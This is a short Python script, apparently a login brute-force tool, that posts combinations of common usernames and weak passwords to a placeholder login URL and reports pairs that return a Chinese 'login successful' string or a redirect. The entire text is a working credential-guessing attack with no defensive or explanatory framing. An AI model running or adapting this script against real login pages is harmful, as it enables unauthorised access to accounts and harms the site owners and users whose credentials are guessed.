import requests

weak_passwords = ['123456', 'password', 'admin', '123123', 'admin123', 'root']
common_users = ['admin', 'root', 'test', 'system']

url = "http://target.com/login"

for user in common_users:
    for pwd in weak_passwords:
        resp = requests.post(url, data={'username': user, 'password': pwd})
        if "登录成功" in resp.text or resp.status_code == 302:
            print(f": {user} / {pwd}")
